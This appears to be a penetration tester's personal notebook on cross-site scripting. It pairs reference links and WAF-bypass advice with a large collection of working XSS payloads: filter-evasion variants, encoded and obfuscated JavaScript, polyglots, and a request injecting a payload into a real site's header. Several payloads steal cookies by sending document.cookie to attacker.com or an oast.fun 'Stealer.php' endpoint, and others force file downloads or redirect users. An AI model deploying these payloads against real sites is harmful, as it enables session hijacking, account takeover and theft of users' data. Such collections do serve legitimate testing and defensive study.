# Further Learning
> https://aszx87410.github.io/beyond-xss/en/
> https://thespanner.co.uk/2009/03/20/html5-xss
> https://thespanner.co.uk/2008/12/01/location-based-xss-attacks
> https://thespanner.co.uk/2009/11/23/bypassing-csp-for-fun-no-profit
> https://thespanner.co.uk/

> https://sirdarckcat.blogspot.com/2008/10/about-css-attacks.html
> https://blog.jeremiahgrossman.com/2009/06/results-unicode-leftright-pointing.html

<pre lang="javascript"> &lt;video src=1 onerror=alert(1)&gt; &lt;audio src=1 onerror=alert(1)&gt; </pre>
 

## Account Take Over
> https://xss.example.com/?input=<script>document.location="http://attacker.com/index.php?cookie=" + document.cookie;</script>

# Identifying XSS
1. Look for input fields
2. Type in the payload. Simple payloads prolly won't work bc of sanitation
3. More than <script> tags
- test on HTML tag attributes like onload, onclick, onerror
- HTTP URL schemes like javascript: and data:
- with data: you can pass a base64 encode of the script payload
- like data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"
- or just pass the script 

# XSS Validation
## Client-Side and Server side
A Web app can use both, determine 
where the validations and sanitation are applied
and mutate the payload accordingly

Read Open Source Frameworks for static analysis
of the XSS Prevention implementations

Reading source code can help you detect 
if there is a possibility of XSS like DOM-XSS

Look at cookie implementation to see how you can
escalate an XSS by stealing user cookies 
check httponly flag

> GET /member/home/index.htm/x.jpeg?t=2021111121 HTTP/2
```
Host: www.glassdoor.com
X-Forwarded-For: xss 
X-Forwarded-For: xss><svg/onload=globalThis[`al`+/ert/.source]`1`// 
X-Forwarded-For: > 
Cookie: gdId=xss</script%20
```

## Bypassing WAFs
"Understand that when you are put up against a WAF that it's all trial and error.
You put in a few possible payloads and go a few characters at a time until 
you understand what is causing the WAF to kill the request"
[- Brett B](https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/)

# Cheatsheet
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet

Everything about web application firewalls (WAFs) from a security perspective. 🔥
https://github.com/0xInfection/Awesome-WAF

Payloads All The Things
A list of useful payloads and bypasses for Web Application Security. Feel free to improve with your payloads and techniques !
https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/#other-ways

https://html5sec.org/

polyglot
https://web.archive.org/web/20190617111911/https://polyglot.innerht.ml/

IoT
https://github.com/OWASP/IoTGoat/

https://cheatsheetseries.owasp.org/index.html

XSS Filter Evasion Cheat Sheet
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

On ruling out false XSS with innerHTML 
TIP: Scan source code for how innerHTML is used. 

HTML specifies that a <script> tag inserted with innerHTML should not execute.
https://www.w3.org/TR/2008/WD-html5-20080610/dom.html#innerhtml0

However, there are ways to execute JavaScript without using <script> elements, 
so there is still a security risk whenever you use innerHTML to set strings 
over which you have no control. For example:
const name = "<img src='x' onerror='alert(1)'>";
el.innerHTML = name; // shows the alert

Test image uploads with image URL in URL

====================
 On report writing |
====================
For that reason, it is recommended that instead of innerHTML you use:
Node.textContent when inserting plain text, as this inserts it as raw text rather than parsing it as HTML.
https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations

XSS’s impact depends on a variety of factors: whether it’s stored or
reflected, whether cookies are accessible, where the payload executes etc
Despite the potential damage XSS can cause on a site, fixing XSS vulnerabilities is often easy

When they say they have fixed your issue, please test again to confirm that it has really be fixed. 
if it isn't fixed properly, point out to them to make a proper complete fix.

## XSS Polymorphism 
- Changing your payload based of sanitation information received from the target
- if your payload is getting sanitized, 
how do you by pass the sanitization?
Under the sanitization and craft a clever payload 
that passes the sanitation
- maybe pass malformed html/js payloads
- see https://klikki.fi/yahoo-mail-stored-xss/
- see https://mahmoudsec.blogspot.com/2015/09/how-i-found-xss-vulnerability-in-google.html


There are HTML attributes that executes javascript
For example, these HTML
Event Attributes that execute JavaScript being outside a <script> tag:
<b onmouseover=alert('XSS')>Click Me!</b>
<svg onload=alert(1)>
<body onload="alert('XSS')">
<img src="http://test.cyberspacekittens.com"
onerror=alert(document.cookie);>

See https://html5sec.org/
Turning HTML Injection into XSS
<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>


# BROWSERS HACKERS HANDBOOK
## URL OBFUSCATION
The following are ways in which to obfuscate a URL:
■ URL Shorteners
■ URL Redirectors
■ URL- or ASCII-encoded characters
■ Adding a number of extra, irrelevant query parameters with the malicious
payload either in the middle or toward the end
■ Using the @ symbol within a URL to add fake domain content
■ Converting the hostname into an integer, for example http://3409677458

# PAYLOADS 
### The Ultimate
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

## Cookie Exfiltration
    https://xss.example.com/?input=<script>document.location="http://attacker.com/index.php?cookie=" + document.cookie;</script>

    <script>document.write('<img src="http://dzzwolliujyjdurzfshmn1wh36t7vzx9c.oast.fun/Stealer.php?cookie=' %2B document.cookie%2B '" >');<script>

    <script>document.write('<img src="http://dzzwolliujyjdurzfshmn1wh36t7vzx9c.oast.fun/Stealer.php?cookie=' %2B document.cookie%2B '" >');<script>
    Forcing the Download of a File: 
    <script>var link = document.createElement('a'); link.href ='http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe';
    link.download = ''; document.body.appendChild(link); link.click();
    </script>

## Links 
https://github.com/payloadbox/xss-payload-list
https://github.com/xmendez/wfuzz/tree/master/wordlist
https://netsec.expert/posts/xss-in-2020/

<?xml-stylesheet > <img src=x onerror="alert('DOMPurify bypassed!!!')"> ?>

<img src='x' onerror='alert(1)'>
<img src="x" onerror="alert('XXsed by 07B4')">

<img src="" onerror="alert(document.cookie)" />

<input type="text" name="username" value="sense" onfocus=alert(document.cookie) autofocus "" width=50px>

<span style="color: red"> Github </span>

Using the following JavaScript within the Uber URL, Kettle escaped
the AngularJS Sandbox and executed the alert function:

    https://developer.uber.com/docs/deep-linking?q=wrtz{{(_="".sub).call.call({}
    [$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")
    ()}}zzzz
MORAL: Search for sandbox escape payloads

## Attacker input to innerHTML
<img src="test.jpg" alt="``onload=xss()" />
double encoded <TEST WITH PROXY>
%253Cimg%2520src%253D%2522test.jpg%2522%2520alt%253D%2522%2560%2560onload%253Dxss%2528%2529%2522%2520%252F%253E

## browser output
<IMG alt=``onload=xss() src="test.jpg">

## Data URIs 
[From 2007](https://www.gnucitizen.org/blog/bugs-in-the-browser-firefoxs-data-url-scheme-vulnerability/)
> <META http-equiv="refresh" content="5;URL=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">
> data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=


    <s>000'")};--//

    onerror=alert;throw 1;
    onerror=eval;throw'=alert\x281\x29';
Neither of these examples contains suspicious parentheses. However for them
to work, **their injection point has to exist within an attribute of an HTML element.**

## Breaking Filter processing with NULL bytes
Inserting a NULL byte anywhere before a blocked expression
can cause some filters to stop processing the input and therefore not identify
the expression. For example:
%00<script>alert(1)</script>

https://d3adend.org/xss/ghettoBypass

Redirecting User: 
<script>window.location ="https://www.youtube.com/watch?v=dQw4w9WgXcQ";</script>

Other Scripts to Enable Key Loggers, Take Pictures, and More
http://www.xss-payloads.com/payloads-list.html?c#category=capture

    <b onmouseover=alert('NoOnes')>Click Me!</b>
    <svg onload=alert(1)>
    <body onload="alert('XSS')">
    <img src="http://test.cyberspacekittens.com"
    onerror=alert(document.cookie);>

    /*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert()
    )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--
    !>\x3csVg/<sVg/oNloAd=alert()//>\x3e

    <svg/onload=a=self['aler'%2B't']%3Ba(document.domain)>

    a=alert,b=document.domain,a(b)

The WAF does a good job blocking most javascript payloads and appears to block parentheses, backticks, and document objects. If I do find a way to bypass the WAF and execute a javascript alert or similar, I will add a comment to this report.

I set up a Burp match and replace rule that turns XXX into: '"><script src="xsshunter url"></script><h1>test
Then I just put 'FooXXX' into everything I see, and see what happens. That'll find most trivial XSS and SQLi. Then I look at file uploads for SSRF and such.

## Bypassing WAF's
However, the moment I put ?</script> (URL decoded here for readability) my request got immediately swatted down and blocked by the WAF. This was very much expected, however I eat WAFs for breakfast >:)
Before trying to play against the WAF, we have to understand the rules of the game.
A common mistake I see people make when trying to bypass WAFs, or just filters in general for the matter, is they copy and paste generic WAF bypass payloads without actually understanding why the WAF is blocking their requests. Spraying and praying WAFs is usually a waste of time from my experience, so it’s best to test them manually, and most importantly understand them
So my first step when bypassing WAFs is to start out with a blocked payload and remove a character by character until the WAF lets me pass

Luckily, it didn’t take us long to achieve an agreement with the WAF. All I had to do was remove the greater than > sign and I got a 200.


[XSS Polyglot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)

[Param Miner](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content/BurpSuite-ParamMiner)


# XSS AK47
CREDIT: https://d3adend.org/xss/ghettoBypass
 
A ghetto collection of XSS payloads that I find to be useful during penetration tests, 
especially when faced with WAFs or application-based black-list filtering, 
but feel free to disagree or shoot your AK-74 in the air.
                                                                                                        
## Simple character manipulations.  
Note that I use hexadecimal to represent characters that you probably can't type.  For example, \x00 equals a null byte, but you'll need to encode this properly depending on the context (URL encoding \x00 = %00).

## HaRdc0r3 caS3 s3nsit1vITy bYpa55!
<sCrIpt>alert(1)</ScRipt>
<iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)>

## Null-byte character between HTML attribute name and equal sign (IE, Safari).
<img src='1' onerror\x00=alert(0) />

## Slash character between HTML attribute name and equal sign (IE, Firefox, Chrome, Safari).
<img src='1' onerror/=alert(0) />

## Vertical tab between HTML attribute name and equal sign (IE, Safari).
<img src='1' onerror\x0b=alert(0) />

## Null-byte character between equal sign and JavaScript code (IE).
<img src='1' onerror=\x00alert(0) />

## Null-byte character between characters of HTML attribute names (IE).
<img src='1' o\x00nerr\x00or=alert(0) />

## Null-byte character before characters of HTML element names (IE).
<\x00img src='1' onerror=alert(0) />

## Null-byte character after characters of HTML element names (IE, Safari).
<script\x00>alert(1)</script>

## Null-byte character between characters of HTML element names (IE).
<i\x00mg src='1' onerror=alert(0) />

## Use slashes instead of whitespace (IE, Firefox, Chrome, Safari).
<img/src='1'/onerror=alert(0)>

## Use vertical tabs instead of whitespace (IE, Safari).
<img\x0bsrc='1'\x0bonerror=alert(0)>

## Use quotes instead of whitespace in some situations (Safari).
<img src='1''onerror='alert(0)'>
<img src='1'"onerror="alert(0)">

## Use null-bytes instead of whitespaces in some situations (IE).
<img src='1'\x00onerror=alert(0)>

## Just don't use spaces (IE, Firefox, Chrome, Safari).
<img src='1'onerror=alert(0)>

## Prefix URI schemes.
Firefox (\x09, \x0a, \x0d, \x20)
Chrome (Any character \x01 to \x20)
<iframe src="\x01javascript:alert(0)"></iframe> <!-- Example for Chrome -->

## No greater-than characters needed (IE, Firefox, Chrome, Safari).
<img src='1' onerror='alert(0)' <

## Extra less-than characters (IE, Firefox, Chrome, Safari).
<<script>alert(0)</script>

## Backslash character between expression and opening parenthesis (IE).
<style>body{background-color:expression\(alert(1))}</style>

## JavaScript Escaping
<script>document.write('<a hr\ef=j\avas\cript\:a\lert(2)>blah</a>');</script>

# Encoding Galore.

## HTML Attribute Encoding
<img src="1" onerror="alert(1)" />
<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
<iframe src="javascript:alert(1)"></iframe>
<iframe src="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;"></iframe>

## URL Encoding
<iframe src="javascript:alert(1)"></iframe>
<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>

## CSS Hexadecimal Encoding (IE specific examples)
<div style="x:expression(alert(1))">Joker</div>
<div style="x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))">Joker</div>
<div style="x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))">Joker</div>
<div style="x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029">Joker</div>

## JavaScript (hexadecimal, octal, and unicode)
<script>document.write('<img src=1 onerror=alert(1)>');</script>
<script>document.write('\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x31\x20\x6F\x6E\x65\x72\x72\x6F\x72\x3D\x61\x6C\x65\x72\x74\x28\x31\x29\x3E');</script>
<script>document.write('\074\151\155\147\040\163\162\143\075\061\040\157\156\145\162\162\157\162\075\141\154\145\162\164\050\061\051\076');</script>
<script>document.write('\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0031\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029\u003E');</script>

## JavaScript (Decimal char codes)
<script>document.write('<img src=1 onerror=alert(1)>');</script>
<script>document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,49,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,48,41,62));</script>

## JavaScript (Unicode function and variable names)
<script>alert(123)</script>
<script>\u0061\u006C\u0065\u0072\u0074(123)</script>

## Overlong UTF-8 (SiteMinder is awesome!)
< = %C0%BC = %E0%80%BC = %F0%80%80%BC
> = %C0%BE = %E0%80%BE = %F0%80%80%BE
' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2

<img src="1" onnerror="alert(1)">
U+003Cimg src="1" onnerror="alert(1)"U+003E
%E0%80%BCimg%20src%3D%E0%80%A21%E0%80%A2%20onerror%3D%E0%80%A2alert(1)%E0%80%A2%E0%80%BE

## UTF-7 (Missing charset?)
<img src="1" onerror="alert(1)" />
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-

## Unicode .NET Ugliness
<script>alert(1)</script>
%uff1cscript%uff1ealert(1)%uff1c/script%uff1e

## Classic ASP performs some unicode homoglyphic translations... don't ask why...
<img src="1" onerror="alert('1')">
%u3008img%20src%3D%221%22%20onerror%3D%22alert(%uFF071%uFF07)%22%u232A

Useless and/or Useful features.

## HTML 5 (Not comphrensive)
<video src="http://www.w3schools.com/html5/movie.ogg" onloadedmetadata="alert(1)" />
<video src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)" />

## Usage of non-existent elements (IE)
<blah style="blah:expression(alert(1))" />

CSS Comments (IE)
<div style="z:exp/*anything*/res/*here*/sion(alert(1))" />

Alternate ways of executing JavaScript functions
<script>window['alert'](0)</script>
<script>parent['alert'](1)</script>
<script>self['alert'](2)</script>
<script>top['alert'](3)</script>

Split up JavaScript into HTML attributes
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>

## HTML is parsed before JavaScript
<script>
var junk = '</script><script>alert(1)</script>';
</script>

## HTML is parsed before CSS
<style>
body { background-image:url('http://www.blah.com/</style><script>alert(1)</script>'); }
</style>

XSS in XML documents [doctype = text/xml] (Firefox, Chrome, Safari).
<?xml version="1.0" ?>
<someElement>
	<a xmlns:a='http://www.w3.org/1999/xhtml'><a:body onload='alert(1)'/></a>
</someElement>

## URI Schemes
<iframe src="javascript:alert(1)"></iframe>
<iframe src="vbscript:msgbox(1)"></iframe> (IE)
<iframe src="data:text/html,<script>alert(0)</script>"></iframe> (Firefox, Chrome, Safari)
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe> (Firefox, Chrome, Safari)

## HTTP Parameter Pollution
http://target.com/something.xxx?a=val1&a=val2
ASP.NET 	a = val1,val2
ASP 		a = val1,val2
JSP 		a = val1
PHP 		a = val2

Two Stage XSS via fragment identifier (bypass length restrictions / avoid server logging)
<script>eval(location.hash.slice(1))</script>
<script>eval(location.hash)</script> (Firefox)

http://target.com/something.jsp?inject=<script>eval(location.hash.slice(1))</script>#alert(1)

Two Stage XSS via name attribute
<iframe src="http://target.com/something.jsp?inject=<script>eval(name)</script>" name="alert(1)"></iframe>

Non-alphanumeric crazyness...
<script>
$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();
</script>

<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>